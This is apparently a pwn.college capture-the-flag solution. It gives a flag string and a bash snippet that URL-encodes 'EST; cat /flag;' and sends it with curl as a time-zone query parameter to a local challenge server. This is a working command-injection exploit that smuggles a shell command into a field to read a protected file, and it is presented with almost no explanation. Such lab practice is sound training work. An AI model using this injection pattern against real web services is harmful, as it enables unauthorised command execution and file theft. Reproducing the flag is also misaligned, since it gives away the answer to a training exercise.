# Solution
pwn.college{wepVmPU2g_lNYz8cdONVNcZVYmJ.dhDOzMDL3MTM3QzW}
# Code

```bash
# Performing URL Encoding
path_to_encode="EST; cat /flag;" 
url_encoded_path=$(echo -n "$path_to_encode" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
curl -v "http://challenge.localhost:80/milestone?time-zone=$url_encoded_path"
```
